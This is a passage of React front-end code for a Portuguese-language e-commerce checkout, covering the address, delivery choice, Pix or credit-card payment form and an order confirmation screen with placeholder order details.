                            <div className="relative">
                              <label htmlFor="neighborhood" className="block text-sm font-medium text-gray-700 mb-1">
                                Bairro
                              </label>
                              <input
                                type="text"
                                id="neighborhood"
                                name="neighborhood"
                                value={formData.neighborhood}
                                onChange={handleChange}
                                className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                required
                              />
                              <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                                </svg>
                              </div>
                            </div>
                            <div className="relative">
                              <label htmlFor="complement" className="block text-sm font-medium text-gray-700 mb-1">
                                Complemento (opcional)
                              </label>
                              <input
                                type="text"
                                id="complement"
                                name="complement"
                                value={formData.complement}
                                onChange={handleChange}
                                className="w-full p-2 pr-10 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              />
                              <div className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none top-6">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                              </div>
                            </div>
                            <input type="hidden" name="city" value={formData.city} />
                            <input type="hidden" name="state" value={formData.state} />
                          </div>
                        )}
                      </div>

                      <div className="flex justify-between">
                        <button
                          onClick={handlePrevStep}
                          className="bg-gray-300 text-gray-800 px-6 py-3 rounded-md font-semibold hover:bg-gray-400 transition-colors duration-300 shadow-md"
                        >
                          Voltar
                        </button>
                        <button
                          onClick={handleNextStep}
                          className="bg-[#4CAF50] text-white px-6 py-3 rounded-md font-semibold hover:bg-green-700 transition-colors duration-300 shadow-md"
                        >
                          Avançar
                        </button>
                      </div>
                    </div>
                  );
                case 3: // Opção de Entrega
                  return (
                    <div className="space-y-6">
                      <div className="bg-white p-4 rounded-md border border-gray-200">
                        <h2 className="text-xl font-semibold text-gray-700 mb-4">Como você quer receber o seu pedido?</h2>
                        <div className="space-y-4">
                          <label
                            className={`flex items-center justify-between p-4 border rounded-md cursor-pointer transition-colors duration-200
                              ${deliveryOption === 'correios' ? 'border-[#008080] ring-2 ring-[#008080]' : 'border-gray-300 hover:bg-gray-100'}`}
                          >
                            <input
                              type="radio"
                              name="deliveryOption"
                              value="correios"
                              checked={deliveryOption === 'correios'}
                              onChange={(e) => setDeliveryOption(e.target.value)}
                              className="h-4 w-4 text-[#008080] focus:ring-[#008080] mr-3"
                            />
                            <div className="flex items-center flex-grow">
                              <Truck className="h-6 w-6 text-gray-600 mr-3" /> {/* Ícone de Caminhão */}
                              <div>
                                <span className="text-gray-800 font-medium">Correios</span>
                                <p className="text-sm text-gray-500">6 a 9 dias úteis</p>
                              </div>
                            </div>
                            <span className="font-bold text-[#4CAF50]">Grátis</span>
                          </label>

                          <label
                            className={`flex items-center justify-between p-4 border rounded-md cursor-pointer transition-colors duration-200
                              ${deliveryOption === 'entregaExpressa' ? 'border-[#008080] ring-2 ring-[#008080]' : 'border-gray-300 hover:bg-gray-100'}`}
                          >
                            <input
                              type="radio"
                              name="deliveryOption"
                              value="entregaExpressa"
                              checked={deliveryOption === 'entregaExpressa'}
                              onChange={(e) => setDeliveryOption(e.target.value)}
                              className="h-4 w-4 text-[#008080] focus:ring-[#008080] mr-3"
                            />
                            <div className="flex items-center flex-grow">
                              <Zap className="h-6 w-6 text-gray-600 mr-3" /> {/* Ícone de Raio */}
                              <div>
                                <span className="text-gray-800 font-medium">Entrega Expressa</span>
                                <p className="text-sm text-gray-500">3 a 5 dias úteis</p>
                              </div>
                            </div>
                            <span className="font-bold text-[#4CAF50]">
                              Grátis <span className="font-normal">{formData.city && `para ${formData.city}`}</span>
                            </span>
                          </label>
                        </div>
                      </div>

                      <div className="flex justify-between">
                        <button
                          onClick={handlePrevStep}
                          className="bg-gray-300 text-gray-800 px-6 py-3 rounded-md font-semibold hover:bg-gray-400 transition-colors duration-300 shadow-md"
                        >
                          Voltar
                        </button>
                        <button
                          onClick={handleNextStep}
                          className="bg-[#4CAF50] text-white px-6 py-3 rounded-md font-semibold hover:bg-green-700 transition-colors duration-300 shadow-md"
                        >
                          Avançar
                        </button>
                      </div>
                    </div>
                  );
                case 4: // Pagamento
                  return (
                    <div className="space-y-6">
                      <div className="bg-white p-4 rounded-md border border-gray-200">
                        <h2 className="text-xl font-semibold text-gray-700 mb-4">Forma de Pagamento</h2>
                        <div className="space-y-4">
                          <label className="flex flex-col p-3 border border-gray-300 rounded-md cursor-pointer hover:bg-gray-100 transition-colors duration-200">
                            <div className="flex items-center">
                              <input
                                type="radio"
                                name="paymentMethod"
                                value="pix"
                                checked={paymentMethod === 'pix'}
                                onChange={(e) => setPaymentMethod(e.target.value)}
                                className="h-4 w-4 text-[#008080] focus:ring-[#008080]"
                              />
                              <span className="ml-3 text-gray-800 font-medium">
                                Pix <span className="text-[#4CAF50] font-bold">(5% de desconto)</span>
                              </span>
                            </div>
                            {paymentMethod === 'pix' && (
                              <p className="mt-4 text-gray-700 text-center p-4 bg-green-50 rounded-md border border-green-200">
                                Ao finalizar o pedido, o código Pix será gerado e enviado para o seu e-mail.
                              </p>
                            )}
                          </label>

                          <label className="flex items-center p-3 border border-gray-300 rounded-md cursor-pointer hover:bg-gray-100 transition-colors duration-200">
                            <input
                              type="radio"
                              name="paymentMethod"
                              value="creditCard"
                              checked={paymentMethod === 'creditCard'}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                              className="h-4 w-4 text-[#008080] focus:ring-[#008080]"
                            />
                            <span className="ml-3 text-gray-800 font-medium">Cartão de Crédito</span>
                          </label>
                        </div>

                        {paymentMethod === 'creditCard' && (
                          <div className="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div className="md:col-span-2 flex justify-center mb-6">
                              <CardSummaryDisplay
                                cardName={formData.cardName}
                                cardValidity={formData.cardValidity}
                                cardNumber={formData.cardNumber}
                                cardCvv={formData.cardCvv}
                                isCvvFocused={isCvvFocused}
                              />
                            </div>

                            <div>
                              <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">
                                Número do Cartão
                              </label>
                              <input
                                type="text"
                                id="cardNumber"
                                name="cardNumber"
                                value={formData.cardNumber}
                                onChange={handleChange}
                                className="w-full p-2 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                required
                                maxLength="19"
                              />
                            </div>
                            <div className="grid grid-cols-2 gap-4 col-span-full">
                              <div>
                                <label htmlFor="cardValidity" className="block text-sm font-medium text-gray-700 mb-1">
                                  Validade (MM/AA)
                                </label>
                                <input
                                  type="text"
                                  id="cardValidity"
                                  name="cardValidity"
                                  value={formData.cardValidity}
                                  onChange={handleChange}
                                  placeholder="MM/AA"
                                  className="w-full p-2 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                  required
                                />
                              </div>
                              <div>
                                <label htmlFor="cardCvv" className="block text-sm font-medium text-gray-700 mb-1">
                                  Código de Segurança
                                </label>
                                <input
                                  type="text"
                                  id="cardCvv"
                                  name="cardCvv"
                                  value={formData.cardCvv}
                                  onChange={handleChange}
                                  onFocus={() => setIsCvvFocused(true)}
                                  onBlur={() => setIsCvvFocused(false)}
                                  className="w-full p-2 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                                  required
                              />
                            </div>
                          </div>
                          <div className="md:col-span-2">
                            <label htmlFor="cardName" className="block text-sm font-medium text-gray-700 mb-1">
                              Nome e Sobrenome do Titular
                            </label>
                            <input
                              type="text"
                              id="cardName"
                              name="cardName"
                              value={formData.cardName}
                              onChange={handleChange}
                              className="w-full p-2 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                              required
                            />
                          </div>
                          <div className="md:col-span-2">
                            <label htmlFor="installments" className="block text-sm font-medium text-gray-700 mb-1">
                              Número de Parcelas
                            </label>
                            <select
                              id="installments"
                              name="installments"
                              value={formData.installments}
                              onChange={handleChange}
                              className="w-full p-2 border border-gray-300 rounded-md focus:ring-[#008080] focus:border-[#008080]"
                            >
                              <option value="1">1x sem juros</option>
                              <option value="2">2x sem juros</option>
                              <option value="3">3x sem juros</option>
                              {/* Opções de parcelamento estendidas até 12x */}
                              <option value="4">4x com juros</option>
                              <option value="5">5x com juros</option>
                              <option value="6">6x com juros</option>
                              <option value="7">7x com juros</option>
                              <option value="8">8x com juros</option>
                              <option value="9">9x com juros</option>
                              <option value="10">10x com juros</option>
                              <option value="11">11x com juros</option>
                              <option value="12">12x com juros</option>
                            </select>
                          </div>
                        </div>
                      )}
                    </div>

                    <div className="flex justify-between">
                      <button
                        onClick={handlePrevStep}
                        className="bg-gray-300 text-gray-800 px-6 py-3 rounded-md font-semibold hover:bg-gray-400 transition-colors duration-300 shadow-md"
                      >
                        Voltar
                      </button>
                      <button
                        onClick={handleNextStep}
                        className="bg-[#4CAF50] text-white px-6 py-3 rounded-md font-semibold hover:bg-green-700 transition-colors duration-300 shadow-md"
                      >
                        Avançar
                      </button>
                    </div>
                  </div>
                );
              case 6: // Confirmação Final
                return (
                  // Fundo da página de Confirmação alterado para #e6dcd0
                  <div className="min-h-screen bg-[#e6dcd0] flex flex-col items-center p-4 font-sans">
                    {/* LOGO */}
                    <div className="mb-8 flex justify-center items-center py-4">
                      <img
                        src="https://imgur.com/Caukxvf.png"
                        alt="Logo Armazém do Conforto"
                        className="w-auto h-20 mx-auto"
                        onError={(e) => { e.target.onerror = null; e.target.src="https://placehold.co/100x50/8B0000/FFFFFF?text=LOGO" }}
                      />
                    </div>

                    {/* Conteúdo principal da confirmação */}
                    <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
                      <CheckCircle className="h-20 w-20 text-[#4CAF50] mx-auto mb-6 animate-bounce" />
                      <h2 className="text-3xl font-bold text-gray-800 mb-4">Pedido Concluído com Sucesso!</h2>
                      <p className="text-lg text-gray-700 mb-6">
                        Parabéns pela sua compra! Seu pedido foi processado com sucesso.
                        Você receberá um e-mail após a postagem com as informações do rastreamento em breve.
                        Agradecemos a sua preferência!
                      </p>
                      {/* Seção de Detalhes do Pedido (placeholder) */}
                      <div className="bg-gray-100 p-4 rounded-md mb-6 text-left">
                        <h3 className="text-xl font-semibold text-gray-700 mb-2">Detalhes do Pedido:</h3>
                        <p className="text-gray-600"><strong>Número do Pedido:</strong> #2196</p>
                        <p className="text-gray-600"><strong>Método de Pagamento:</strong> {paymentMethod === 'creditCard' ? 'Cartão de Crédito' : 'Pix'}</p>
                        <p className="text-gray-600"><strong>Total:</strong> R$ 94,05</p>
                        <p className="text-gray-600"><strong>Entrega Estimada:</strong> {deliveryOption === 'correios' ? '6 a 9 dias úteis' : '3 a 5 dias úteis'}</p>
                      </div>
                      <button
                        onClick={() => setCurrentStep(1)} // Opção para reiniciar o processo
                        className="bg-[#4CAF50] text-white px-8 py-4 rounded-lg font-bold text-lg hover:bg-green-700 transition-colors duration-300 shadow-lg transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#4CAF50] focus:ring-opacity-50"
                      >
                        Voltar ao Início
                      </button>
                    </div>
                  </div>
                );
              default:
                return null;
            }
          })()}
        </div>
      </>
    )}
  </div>
);
};
export default App;
